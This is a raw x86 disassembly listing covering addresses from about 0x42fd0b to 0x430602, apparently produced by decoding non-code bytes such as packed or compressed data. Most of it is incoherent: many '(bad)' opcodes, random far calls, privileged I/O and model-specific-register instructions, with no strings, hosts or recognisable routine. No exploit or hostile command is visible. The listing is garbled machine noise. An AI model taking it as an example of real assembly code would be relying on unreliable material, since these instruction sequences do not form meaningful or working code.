  42fd0b:	sbb    al,0x77
  42fd0d:	adc    DWORD PTR [eax-0x40],esp
  42fd10:	mov    ebx,0xdf941773
  42fd15:	sbb    bl,BYTE PTR [ecx+edi*1+0x73]
  42fd19:	jbe    0x42fcac
  42fd1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd1c:	imul   edx,edx,0x7e269f69
  42fd22:	enter  0x9f3c,0x69
  42fd26:	mov    eax,ds:0x54a42637
  42fd2b:	shr    DWORD PTR [esi],0x81
  42fd2e:	mov    cl,BYTE PTR [eax]
  42fd30:	out    0xeb,eax
  42fd32:	sub    BYTE PTR [esi],ch
  42fd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x98
  42fda3:	jns    0x42fdc9
  42fda5:	cwde   
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [ebx+0x7b481ad],al
  42fdb3:	add    al,0x36
  42fdb5:	into   
  42fdb6:	pop    edx
  42fdb7:	ret    
  42fdb8:	pushf  
  42fdb9:	and    al,0xbf
  42fdbb:	daa    
  42fdbc:	out    dx,al
  42fdbd:	call   0xfe71f3b0
  42fdc2:	mov    ah,0x4
  42fdc4:	add    eax,0x27981c20
  42fdc9:	dec    esi
  42fdca:	and    DWORD PTR [ecx-0x71],esi
  42fdcd:	or     DWORD PTR [eax+0x1a],ecx
  42fdd0:	addr16 sahf 
  42fdd2:	sub    al,cl
  42fdd4:	pop    ecx
  42fdd5:	ins    DWORD PTR es:[edi],dx
  42fdd6:	add    ch,al
  42fdd8:	mov    cs,WORD PTR [eax+0x69b214fc]
  42fdde:	pop    ebx
  42fddf:	pusha  
  42fde0:	fcom   QWORD PTR [ebp+ebp*1-0x4e]
  42fde4:	jbe    0x42fe1e
  42fde6:	clc    
  42fde7:	mov    al,ds:0xd08e07b
  42fdec:	add    esi,DWORD PTR [edi]
  42fdee:	pop    ecx
  42fdef:	stc    
  42fdf0:	data16 aam 0x70
  42fdf3:	xor    ecx,esp
  42fdf5:	in     eax,dx
  42fdf6:	sbb    BYTE PTR [ebx+0x41937388],ah
  42fdfc:	shr    DWORD PTR [ebp-0x25750c5e],1
  42fe02:	addr16 clc 
  42fe04:	scas   eax,DWORD PTR es:[edi]
  42fe05:	cld    
  42fe06:	jns    0x42fdbc
  42fe08:	sub    esi,DWORD PTR [ebp+0x4d]
  42fe0b:	cmp    ch,cl
  42fe0d:	xchg   ebp,eax
  42fe0e:	jl     0x42fe21
  42fe10:	aad    0x1c
  42fe12:	jns    0x42fe41
  42fe14:	mov    edi,0xa1627fe5
  42fe19:	lds    edx,FWORD PTR [ebx-0x3b]
  42fe1c:	xor    al,0xc7
  42fe1e:	inc    esp
  42fe1f:	or     ch,BYTE PTR [edx]
  42fe21:	jge    0x42fe2a
  42fe23:	xchg   esi,eax
  42fe24:	mov    dl,0xd3
  42fe26:	push   ebp
  42fe27:	call   ebp
  42fe29:	adc    dl,BYTE PTR [edi+0x52e4c522]
  42fe2f:	mov    cl,0xd9
  42fe31:	je     0x42fe57
  42fe33:	push   cs
  42fe34:	or     esi,esi
  42fe36:	pop    ebp
  42fe37:	or     al,0xbd
  42fe39:	xchg   esi,eax
  42fe3a:	out    dx,eax
  42fe3b:	pop    ecx
  42fe3c:	aas    
  42fe3d:	outs   dx,BYTE PTR ds:[esi]
  42fe3e:	fimul  WORD PTR [ebx+eiz*4+0xd]
  42fe42:	jp     0x42fea6
  42fe44:	daa    
  42fe45:	jo     0x42fe39
  42fe47:	les    ebx,FWORD PTR ds:0x1d056004
  42fe4d:	dec    esp
  42fe4e:	pop    es
  42fe4f:	sbb    esp,DWORD PTR [ecx+0x48e2c2ae]
  42fe55:	pop    ebp
  42fe56:	int    0xf3
  42fe58:	mov    cl,BYTE PTR [eax]
  42fe5a:	xor    BYTE PTR [ebp+0x6d8d4d1],ah
  42fe60:	xchg   DWORD PTR [edi*8-0x704f98d2],esi
  42fe67:	sub    BYTE PTR [ebx+0x38],ch
  42fe6a:	dec    ebx
  42fe6b:	js     0x42fdf4
  42fe6d:	mov    dh,0x37
  42fe6f:	or     al,0xf4
  42fe71:	sub    dl,BYTE PTR [ecx-0x5b]
  42fe74:	ins    DWORD PTR es:[edi],dx
  42fe75:	test   edi,edi
  42fe77:	fcomip st,st(5)
  42fe79:	xor    al,0x5c
  42fe7b:	jne    0x42fed6
  42fe7d:	repnz in al,0x69
  42fe80:	push   edx
  42fe81:	mov    ebx,0xdf26723d
  42fe86:	dec    edx
  42fe87:	sbb    al,0x41
  42fe89:	mov    DWORD PTR [esi+0x29],ecx
  42fe8c:	add    DWORD PTR [edi-0x4f],0xe0a17666
  42fe93:	and    esi,ebx
  42fe95:	push   esi
  42fe96:	sbb    BYTE PTR [edi],0x45
  42fe99:	dec    esi
  42fe9a:	imul   BYTE PTR [ebx]
  42fe9c:	fwait
  42fe9d:	adc    DWORD PTR [esi+0x11189361],ebx
  42fea3:	jecxz  0x42fe7a
  42fea5:	aam    0xd2
  42fea7:	push   0x19
  42fea9:	or     bl,ah
  42feab:	xchg   ecx,eax
  42feac:	mov    eax,ds:0xe352f22
  42feb1:	xchg   BYTE PTR [esi+0x7245],ah
	...
  42ff13:	add    BYTE PTR [eax],al
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	dec    ecx
  42ff23:	mov    al,ds:0x21a1627
  42ff28:	add    al,BYTE PTR [eax]
  42ff2a:	pop    DWORD PTR [eax]
  42ff2c:	add    BYTE PTR [eax],al
  42ff2e:	push   esp
  42ff2f:	les    ecx,FWORD PTR ds:0x65252edf
  42ff35:	fs dec ebp
  42ff37:	pop    eax
  42ff38:	aaa    
  42ff39:	cmp    BYTE PTR [edx+0x6d],bh
  42ff3c:	fimul  WORD PTR ds:0x4ff832fd
  42ff42:	cdq    
  42ff43:	jg     0x42ff9d
  42ff45:	stos   DWORD PTR es:[edi],eax
  42ff46:	outs   dx,BYTE PTR ds:[esi]
  42ff47:	imul   edi,DWORD PTR [eax],0x16
  42ff4a:	add    eax,0xa243f8b4
  42ff4f:	out    dx,eax
  42ff50:	outs   dx,DWORD PTR ds:[esi]
  42ff51:	ds pop ebp
  42ff53:	popa   
  42ff54:	pop    esp
  42ff55:	mov    bl,dh
  42ff57:	cwde   
  42ff58:	imul   BYTE PTR [ecx+ecx*2+0x72b6c12d]
  42ff5f:	ret    0x7aea
  42ff62:	fcmovbe st,st(3)
  42ff64:	and    BYTE PTR ds:0x68231c7e,ch
  42ff6a:	fnclex 
  42ff6c:	repz jge 0x42ffc4
  42ff6f:	mov    eax,ds:0x13e6af32
  42ff74:	mov    ebx,0xe929cf59
  42ff79:	push   ebp
  42ff7a:	call   0x22f4:0x71098b40
  42ff81:	push   eax
  42ff82:	xchg   edx,eax
  42ff83:	popa   
  42ff84:	fs repnz fs ins BYTE PTR es:[edi],dx
  42ff88:	dec    edx
  42ff89:	mov    eax,DWORD PTR [ebx]
  42ff8b:	adc    al,0x81
  42ff8d:	pop    edi
  42ff8e:	or     eax,0xc1ba08ae
  42ff93:	call   FWORD PTR [ebx+eax*4+0x7948f9e1]
  42ff9a:	dec    ecx
  42ff9b:	test   eax,0x789d5f3a
  42ffa0:	mov    dh,0x38
  42ffa2:	repnz mov al,0x1f
  42ffa5:	dec    ebp
  42ffa6:	mov    cl,0xaa
  42ffa8:	inc    edx
  42ffa9:	inc    esp
  42ffaa:	ror    bl,0x4b
  42ffad:	or     DWORD PTR [edi-0x31],edx
  42ffb0:	test   BYTE PTR [eax],0x76
  42ffb3:	clc    
  42ffb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffb5:	shr    DWORD PTR [esi-0x52fb822d],cl
  42ffbb:	or     al,0x84
	...
  430015:	add    BYTE PTR [ebp+0x55],cl
  430018:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43001e:	mov    esp,ebp
  430020:	or     al,ah
  430022:	dec    ebp
  430023:	add    bh,al
  430025:	add    BYTE PTR [eax],cl
  430027:	add    BYTE PTR [eax],al
  430029:	mov    DWORD PTR [eax],0x3ef44545
  43002f:	xor    eax,0x9c8b8500
  430034:	hlt    
  430035:	clc    
  430036:	retf   
  430037:	(bad)  
  430038:	enter  0x4d45,0xb8
  43003c:	mov    esi,DWORD PTR [esp+esi*8]
  43003f:	test   ebx,ecx
  430041:	pushf  
  430042:	enter  0x4df8,0x8b
  430046:	mov    DWORD PTR [ebp+0x8],0x894708
  43004d:	inc    ebp
  43004e:	mov    ebp,0xff8bfffc
  430053:	dec    ebp
  430054:	mov    ch,0xf4
  430056:	call   DWORD PTR [ebx-0x1]
  430059:	mov    ebx,0x8005322
  43005e:	call   DWORD PTR [ecx+0x8]
  430061:	pop    es
  430062:	jmp    0xb8:0x9cb4533
  430069:	call   0xc3:0x32f4728b
  430070:	call   0x8989:0x3c83203
  430077:	dec    ebp
  430078:	or     ah,al
  43007a:	inc    ebp
  43007b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430081:	xor    eax,DWORD PTR [eax]
  430083:	retf   
  430084:	ret    
  430085:	add    eax,esi
  430087:	enter  0x8945,0x64
  43008b:	dec    ebp
  43008c:	sbb    ah,cl
  43008e:	add    BYTE PTR [ebx-0xb87b277],cl
  430094:	dec    DWORD PTR [ebx-0xbcfb275]
  43009a:	test   DWORD PTR [ebx],esi
  43009c:	dec    ebx
  43009e:	inc    DWORD PTR [ebx]
  4300a0:	inc    eax
  4300a1:	enter  0x8989,0x64
  4300a5:	(bad)  
  4300a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4300aa:	cld    
  4300ab:	dec    DWORD PTR [ebp-0xa90001]
  4300b1:	push   edi
  4300b2:	mov    BYTE PTR [edx+0x1],ch
  4300b5:	and    BYTE PTR [eax],al
  4300b7:	pop    ecx
  4300b8:	inc    ebp
  4300b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4300bf:	push   0xffffff89
  4300c1:	pop    ecx
  4300c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300c3:	dec    ebp
  4300c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4300ca:	jne    0x430114
  4300cc:	lea    eax,[eax]
  4300ce:	fs (bad) 
  4300d0:	dec    DWORD PTR [eax]
  4300d2:	mov    DWORD PTR [eax],eax
  4300d4:	test   al,0x0
  4300d6:	add    BYTE PTR [ebp-0x18],cl
  4300d9:	xor    ebp,DWORD PTR [edx]
  4300db:	add    eax,DWORD PTR [eax]
  4300dd:	mov    eax,eax
  4300df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4300e6:	inc    ebp
  4300e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4300ed:	popa   
  4300ee:	mov    esp,DWORD PTR [ebp-0x75]
  4300f1:	(bad)  
  4300f2:	cld    
  4300f3:	inc    eax
  4300f4:	cmp    bh,0x1
  4300f7:	lea    eax,[eax]
  4300f9:	and    BYTE PTR [eax],al
  4300fb:	inc    DWORD PTR [ecx-0x18]
  4300fe:	mov    ecx,DWORD PTR [ebx]
  430100:	cld    
  430101:	add    BYTE PTR [ecx+0x75014d],cl
  430107:	(bad)  
  430108:	xchg   ebp,eax
  430109:	sar    bh,1
  43010b:	inc    eax
  43010c:	inc    DWORD PTR [eax]
  43010e:	mov    eax,DWORD PTR [ebp-0x4]
  430111:	xor    edx,DWORD PTR [edx+0x7201be]
  430117:	add    BYTE PTR [edx],dl
  430119:	(bad)  
  43011a:	nop
  43011b:	inc    ebp
  43011c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430122:	mov    al,0xff
  430124:	add    bh,bh
  430126:	add    BYTE PTR [ebx],dh
  430128:	inc    DWORD PTR [ebx]
  43012a:	sbb    al,0x89
  43012c:	jne    0x43010a
  43012e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430134:	mov    eax,DWORD PTR [ebp-0xff0048]
  43013a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430141:	inc    DWORD PTR [ebp-0x75]
  430144:	(bad)  [esp+ebp*8]
  430147:	test   DWORD PTR [esi-0x1],esp
  43014a:	inc    ebp
  43014b:	(bad)  
  43014c:	aas    
  43014d:	inc    ebp
  43014e:	(bad)  
  43014f:	lea    edi,[eax+edi*2-0x1]
  430153:	inc    edi
  430155:	mov    DWORD PTR [ecx],edi
  430157:	mov    al,ds:0x8b8000c7
  43015c:	out    dx,al
  43015d:	cld    
  43015e:	loopne 0x4300ed
  430160:	inc    ebp
  430161:	(bad)  
  430162:	in     al,dx
  430163:	(bad)  
  430164:	fisttp WORD PTR [eax+0x8801c7]
  43016a:	jecxz  0x4301b1
  43016c:	out    dx,al
  43016d:	inc    DWORD PTR [ebp-0x4]
  430170:	out    0x8d,eax
  430172:	aas    
  430173:	(bad)  
  430174:	call   0xcb2c78
  430179:	add    DWORD PTR [ebx-0x7f590400],ecx
  43017f:	add    BYTE PTR [ecx],al
  430181:	test   DWORD PTR [eax],eax
  430183:	wrmsr  
  430185:	jae    0x430172
  430187:	add    BYTE PTR [eax],al
  430189:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43018f:	add    esp,edi
  430191:	add    BYTE PTR [eax+0x450108],al
  430197:	mov    edi,DWORD PTR [ebp-0x6c]
  43019a:	add    DWORD PTR [eax],0x4
  43019d:	mov    eax,DWORD PTR [ebp+0x3]
  4301a0:	mov    edi,DWORD PTR [esp+edi*8]
  4301a3:	dec    ebp
  4301a4:	nop
  4301a5:	mov    eax,DWORD PTR [ecx]
  4301a7:	fadd   DWORD PTR [eax]
  4301a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4301b0:	inc    ebp
  4301b1:	push   edx
  4301b2:	call   DWORD PTR [ebp-0x7b]
  4301b5:	mov    esi,DWORD PTR [ebp-0x74]
  4301b8:	mov    eax,DWORD PTR [eax]
  4301ba:	cld    
  4301bb:	mov    eax,DWORD PTR [eax+0x880103]
  4301c1:	add    BYTE PTR [ebp+0x6a],bh
  4301c4:	cmp    edi,0x10
  4301c7:	mov    WORD PTR [ebp+0x0],es
  4301ca:	mov    edx,DWORD PTR [edx-0x4]
  4301cd:	push   ecx
  4301ce:	nop
  4301cf:	inc    DWORD PTR [ecx]
  4301d1:	cld    
  4301d2:	add    BYTE PTR [ebp-0x26],bh
  4301d5:	mov    eax,DWORD PTR [eax]
  4301d7:	cld    
  4301d8:	push   eax
  4301d9:	nop
  4301da:	inc    ebp
  4301db:	add    edi,edi
  4301dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4301e3:	call   0x9446c91b
  4301e8:	cmp    esp,ebx
  4301ea:	movntq QWORD PTR [esi],mm6
  4301ed:	mov    DWORD PTR [eax],0xb87c8b98
  4301f3:	test   ebx,eax
  4301f5:	jmp    DWORD PTR [esi-0x1]
  4301f8:	int    0xe9
  4301fa:	sub    esp,esp
  4301fc:	add    eax,DWORD PTR [ebp-0x30]
  4301ff:	fild   WORD PTR [ebp+0x3f]
  430202:	cmp    eax,edi
  430204:	je     0xc243e626
  43020a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430211:	(bad)  
  430212:	jne    0x4301a0
  430214:	mov    ebx,ecx
  430216:	cld    
  430217:	jl     0x43025e
  430219:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43021f:	inc    ebp
  430220:	call   0xeb2bb0
  430225:	add    BYTE PTR [ebx-0x7f170301],cl
  43022b:	add    DWORD PTR es:[eax],eax
  43022e:	add    al,al
  430230:	xor    BYTE PTR [eax+0x3f],dl
  430233:	inc    ebp
  430234:	add    BYTE PTR [ebx+0xfcd88b],cl
  43023a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430240:	add    DWORD PTR [ecx+0x458be845],ecx
  430246:	fmul   DWORD PTR [ebx+0x8bb800]
  43024c:	cld    
  43024d:	call   0xd82d12
  430252:	dec    DWORD PTR [ebx+0x108ee8ff]
  430258:	add    al,al
  43025a:	push   eax
  43025b:	es inc ebp
  43025d:	inc    ebp
  43025e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430264:	dec    DWORD PTR [ebx-0x3ff70301]
  43026a:	mov    DWORD PTR gs:[eax],eax
  43026d:	call   0x8b6b4832
  430272:	inc    ebp
  430273:	mov    eax,0xe8d8008b
  430278:	add    BYTE PTR [ecx],ch
  43027a:	mov    eax,DWORD PTR [eax]
  43027c:	cld    
  43027d:	mov    eax,eax
  43027f:	call   0x462b12d9
  430284:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43028a:	cld    
  43028b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430292:	xor    BYTE PTR [eax],al
  430294:	push   edi
  430295:	inc    ebp
  430296:	mov    DWORD PTR [ebx],esi
  430298:	in     al,0xb9
  43029a:	inc    ebp
  43029b:	lea    ecx,[ebx-0x3c370301]
  4302a1:	dec    ebp
  4302a2:	call   0x8dc1:0x308328b
  4302a9:	xchg   DWORD PTR [eax+0x1],eax
  4302ac:	inc    DWORD PTR [eax]
  4302ae:	call   0x432bf8
  4302b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4302b9:	jge    0x4302ee
  4302bb:	mov    eax,DWORD PTR [ebx]
  4302bd:	cld    
  4302be:	lea    edx,[eax+0xff0120]
  4302c4:	call   0x432c56
  4302c9:	push   eax
  4302ca:	inc    DWORD PTR [ebp-0x1c]
  4302cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4302d0:	xor    eax,DWORD PTR [eax]
  4302d2:	add    edi,edi
  4302d4:	cmp    ebp,eax
  4302d6:	jne    0x4302fe
  4302d8:	mov    DWORD PTR [eax],0x8b004dd8
  4302de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4302e5:	mov    eax,ebx
  4302e7:	cld    
  4302e8:	test   BYTE PTR [eax+0x32019a],bh
  4302ee:	mov    DWORD PTR [ebp+0x8],esi
  4302f1:	xor    eax,DWORD PTR [ebp-0x73]
  4302f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4302f8:	mov    ebp,eax
  4302fa:	mov    eax,0x33004d29
  4302ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430305:	add    DWORD PTR [eax],eax
  430307:	add    BYTE PTR [ebp+0x30],al
  43030a:	mov    edx,DWORD PTR [edi-0x48]
  43030d:	add    ebx,0xffffffe4
  430310:	test   bp,cx
  430313:	je     0x430340
  430315:	mov    eax,DWORD PTR [ebx]
  430317:	cld    
  430318:	sar    BYTE PTR [eax+0x3b0145],1
  43031e:	pcmpeqw mm4,mm6
  430321:	xor    edi,edi
  430323:	lea    ecx,[ebx-0x239e7470]
  430329:	add    BYTE PTR [ebp+0x50],cl
  43032c:	cmp    eax,DWORD PTR [ebp+0x75]
  43032f:	mov    ebp,DWORD PTR [eax-0x68]
  430332:	test   DWORD PTR [eax],eax
  430334:	clc    
  430335:	push   DWORD PTR [ebp-0x1]
  430338:	lea    ecx,[eax]
  43033a:	int3   
  43033b:	inc    ebp
  43033c:	call   0xfb33cc
  430341:	jne    0x43033b
  430343:	xor    edi,DWORD PTR [ebp-0x41]
  430346:	jmp    0x4303ba
  430348:	mov    eax,DWORD PTR [eax]
  43034a:	mov    eax,0x339545c7
  43034f:	inc    DWORD PTR [ebx]
  430351:	push   DWORD PTR [ecx]
  430353:	xor    eax,0x50eb008b
  430358:	mov    eax,DWORD PTR [ebp-0x3c]
  43035b:	mov    eax,eax
  43035d:	cld    
  43035e:	clc    
  43035f:	ret    
  430360:	test   bh,al
  430362:	pop    es
  430363:	xchg   ebp,eax
  430364:	add    bh,bh
  430366:	inc    ebp
  430367:	dec    DWORD PTR [edi]
  430369:	pop    ds
  43036a:	sub    eax,DWORD PTR [eax]
  43036c:	add    BYTE PTR [eax+0x76],dl
  43036f:	push   ebp
  430370:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430376:	or     al,0xcf
  430378:	inc    eax
  430379:	enter  0x745,0x72
  43037d:	inc    ebp
  43037e:	mov    eax,DWORD PTR [ecx]
  430380:	int3   
  430381:	add    BYTE PTR [ebp-0x75],al
  430384:	xor    eax,0xc74d9cb8
  430389:	xor    edx,eax
  43038b:	lea    eax,[ebp+0x4572f808]
  430391:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430397:	fadd   st,st(6)
  430399:	rol    BYTE PTR [ebp+0x12],0x8b
  43039d:	inc    ebp
  43039e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4303a4:	inc    ebp
  4303a5:	test   bh,al
  4303a7:	call   0xdcf8:0x898532f8
  4303ae:	inc    ebp
  4303af:	inc    ebp
  4303b0:	cmp    esi,DWORD PTR [ebx]
  4303b2:	pushf  
  4303b3:	mov    ecx,0xffb48dc7
  4303b8:	test   eax,ecx
  4303ba:	clc    
  4303bb:	dec    ebp
  4303bc:	inc    ebp
  4303bd:	mov    edi,DWORD PTR [ecx]
  4303bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4303c6:	test   edi,edi
  4303c8:	clc    
  4303c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4303d0:	(bad)  
  4303d1:	enter  0x18e8,0x85
  4303d5:	xor    eax,0xff459cf8
  4303da:	mov    edi,esp
  4303dc:	lock inc ebp
  4303de:	ret    
  4303df:	push   eax
  4303e0:	(bad)  
  4303e1:	idiv   BYTE PTR [ebp+0x0]
  4303e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4303ea:	add    BYTE PTR [ebx],dl
  4303ec:	jmp    0xce053e
  4303f1:	les    eax,FWORD PTR [ebp-0x35]
  4303f4:	mov    ecx,esi
  4303f6:	lock or al,cl
  4303f9:	clc    
  4303fa:	inc    ebp
  4303fb:	add    esi,DWORD PTR [ebx]
  4303fd:	jge    0x430402
  4303ff:	xor    edi,DWORD PTR [ebx]
  430401:	cmp    ecx,DWORD PTR [edi]
  430403:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430408:	mov    edi,DWORD PTR [ecx]
  43040a:	test   al,0xcc
  43040c:	dec    ebp
  43040d:	test   BYTE PTR [ebx],dh
  43040f:	pop    es
  430410:	xor    eax,DWORD PTR [eax]
  430412:	add    ecx,DWORD PTR [esi]
  430414:	add    ecx,eax
  430416:	psraw  mm0,mm1
  430419:	sub    BYTE PTR [ebp+0x38],cl
  43041c:	mov    edi,DWORD PTR [ebx]
  43041e:	lock int3 
  430420:	shl    edx,1
  430422:	rol    BYTE PTR [ebp+0xc],1
  430425:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43042c:	jmp    0x770476
  430431:	pushf  
  430432:	inc    ebp
  430433:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430439:	xor    ecx,ebx
  43043b:	add    ecx,esi
  43043d:	mov    esi,eax
  43043f:	enter  0x45af,0x8b
  430443:	xor    ecx,eax
  430445:	add    edx,DWORD PTR [ebp-0x77]
  430448:	sub    ecx,DWORD PTR [eax]
  43044a:	cmp    eax,DWORD PTR [ebp+0x77]
  43044d:	aad    0x8b
  43044f:	pushf  
  430450:	test   al,0xc7
  430452:	mov    DWORD PTR [eax-0x7747b00],ebp
  430458:	lods   al,BYTE PTR ds:[esi]
  430459:	inc    ebp
  43045a:	dec    ebp
  43045b:	cmp    dh,BYTE PTR [ebx]
  43045d:	pushf  
  43045e:	xor    eax,edi
  430460:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430467:	inc    ebp
  430468:	dec    ebp
  430469:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43046f:	mov    esp,0xf80585d0
  430474:	inc    ebp
  430475:	inc    ebp
  430476:	jmp    0x4304b6
  430478:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43047f:	dec    ebp
  430480:	xor    esi,DWORD PTR [ebx]
  430482:	add    eax,DWORD PTR [ebx]
  430484:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43048a:	dec    ebp
  43048b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430491:	out    dx,eax
  430492:	rol    BYTE PTR [eax],1
  430494:	add    eax,0xebc8458b
  430499:	dec    ebp
  43049a:	mov    ebp,DWORD PTR [ebx]
  43049c:	mov    esp,0x33f84d8b
  4304a1:	ret    
  4304a2:	xor    eax,esi
  4304a4:	add    ecx,eax
  4304a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4304ac:	dec    ebp
  4304ad:	inc    ebp
  4304ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4304b4:	ror    bl,1
  4304b6:	add    eax,0xebc645ce
  4304bb:	scas   eax,DWORD PTR es:[edi]
  4304bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4304c2:	xor    ebp,DWORD PTR [ebx]
  4304c4:	xor    edi,DWORD PTR [ebx]
  4304c6:	add    esi,DWORD PTR [edi+0x3]
  4304c9:	mov    ecx,DWORD PTR [edi]
  4304cb:	clc    
  4304cc:	rol    ebx,0x4d
  4304cf:	(bad)  
  4304d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4304d7:	mov    ah,0x45
  4304d9:	dec    ebp
  4304da:	jbe    0x43050f
  4304dc:	mov    esi,DWORD PTR [ebx]
  4304de:	call   0x334651e6
  4304e3:	rdpmc  
  4304e5:	rol    DWORD PTR [ebx],0x4d
  4304e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4304ee:	inc    ebp
  4304ef:	ror    BYTE PTR [ebx+0x45450808],1
  4304f5:	jmp    0x10b0585
  4304fa:	inc    ebp
  4304fb:	inc    ebp
  4304fc:	(bad)  
  4304fd:	mov    ebx,eax
  4304ff:	clc    
  430500:	test   ebx,eax
  430502:	clc    
  430503:	retf   
  430504:	inc    ebp
  430505:	into   
  430506:	mov    esi,0x8b85afec
  43050c:	clc    
  43050d:	enter  0x5545,0x3b
  430511:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430518:	ret    
  430519:	mov    ah,0xc6
  43051b:	addr16 push 0x338b4545
  430521:	clc    
  430522:	add    eax,ebx
  430524:	loopne 0x4304f1
  430526:	dec    ebp
  430527:	into   
  430528:	mov    al,dh
  43052a:	or     BYTE PTR [edi-0x37ff748e],ch
  430530:	inc    ebp
  430531:	push   ebp
  430532:	mov    ebp,DWORD PTR [ebx]
  430534:	in     al,dx
  430535:	cmp    eax,ebx
  430537:	ja     0x43057e
  430539:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43053f:	inc    ebp
  430540:	call   0xd7c3:0x88f8328b
  430547:	retf   
  430548:	inc    ebp
  430549:	into   
  43054a:	mov    eax,esi
  43054c:	in     al,dx
  43054d:	scas   eax,DWORD PTR es:[edi]
  43054e:	retf   
  43054f:	mov    ecx,DWORD PTR [ebp-0x38]
  430552:	mov    edx,DWORD PTR [ebp-0x24]
  430555:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43055c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430563:	mov    eax,DWORD PTR [ebx]
  430565:	clc    
  430566:	loopne 0x43052b
  430568:	push   ebp
  430569:	retf   
  43056a:	mov    dh,al
  43056c:	adc    esi,ecx
  43056e:	jb     0x43051f
  430570:	add    BYTE PTR [ebx+0x558bc845],cl
  430576:	in     al,dx
  430577:	sub    eax,ebx
  430579:	cmp    ecx,ebx
  43057b:	mov    eax,esi
  43057d:	mov    esp,0x45af03ce
  430582:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430588:	mov    eax,ebx
  43058a:	in     al,dx
  43058b:	into   
  43058c:	dec    ebp
  43058d:	(bad)  
  43058e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430594:	rol    DWORD PTR [ebp+0x4d],0x89
  430598:	xor    esp,esp
  43059a:	sub    eax,DWORD PTR [ebp-0x75]
  43059d:	add    ebp,esp
  43059f:	mov    al,0x55
  4305a1:	inc    ebp
  4305a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4305a8:	retf   0x55dc
  4305ab:	inc    ebp
  4305ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4305af:	pushf  
  4305b0:	(bad)  
  4305b1:	(bad)  
  4305b2:	adc    eax,eax
  4305b4:	jb     0x43053b
  4305b6:	add    al,bh
  4305b8:	enter  0x8645,0x33
  4305bc:	inc    DWORD PTR [ebx]
  4305be:	(bad)  
  4305bf:	jmp    0x430606
  4305c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4305c7:	inc    ebp
  4305c8:	(bad)  
  4305c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4305cf:	call   0xb4d:0x88c132cb
  4305d6:	lea    eax,[ebp+0x8]
  4305d9:	xor    esi,DWORD PTR [edx+0x3]
  4305dc:	add    al,ah
  4305de:	inc    ebp
  4305df:	dec    ebp
  4305e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4305e6:	data16 add ch,cl
  4305e9:	inc    ebp
  4305ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4305f0:	inc    ebp
  4305f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4305f7:	push   ebp
  4305f8:	(bad)  
  4305f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4305ff:	add    ch,ch
  430601:	inc    ebp
  430602:	dec    DWORD PTR [ebx-0x34332775]
